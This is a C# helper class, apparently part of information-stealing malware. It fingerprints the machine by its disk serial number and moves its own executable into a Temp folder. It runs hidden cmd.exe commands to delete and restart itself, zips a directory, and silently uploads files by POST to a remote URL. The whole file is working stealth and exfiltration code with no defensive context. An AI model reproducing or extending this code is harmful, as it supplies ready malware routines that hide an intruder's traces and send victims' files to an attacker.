namespace NoFile
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.IO.Compression;
    using System.Management;
    using System.Net;
    using System.Reflection;

    internal class Helper
    {
        public static string GetHwid()
        {
            string str = "";
            try
            {
                string str2 = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject obj1 = new ManagementObject("win32_logicaldisk.deviceid=\"" + str2 + ":\"");
                obj1.Get();
                str = obj1["VolumeSerialNumber"].ToString();
            }
            catch (Exception)
            {
            }
            return str;
        }

        public static string GetRandomString()
        {
            return Path.GetRandomFileName().Replace(".", "");
        }

        public static string Move()
        {
            try
            {
                string path = Environment.GetEnvironmentVariable("Temp") + @"\" + GetHwid();
                Directory.CreateDirectory(path);
                System.IO.File.Move(Directory.GetCurrentDirectory() + @"\" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name, path + @"\temp.exe");
                return path;
            }
            catch (Exception)
            {
            }
            return null;
        }

        public static void SelfDelete(string dir, string name)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo {
                Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            };
            Process.Start(startInfo);
        }

        public static void SelfRestart(string name)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo {
                Arguments = "/C choice /C Y /N /D Y /T 1 & \"" + name + " --zip\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            };
            Process.Start(startInfo);
        }

        public static void SendFile(string url, string filepath)
        {
            try
            {
                new WebClient().UploadFile(url, "POST", filepath);
            }
            catch (Exception)
            {
            }
        }

        public static void Zip(string dir, string zipPath)
        {
            try
            {
                ZipFile.CreateFromDirectory(dir, zipPath, 0, false);
            }
            catch (Exception)
            {
            }
        }
    }
}

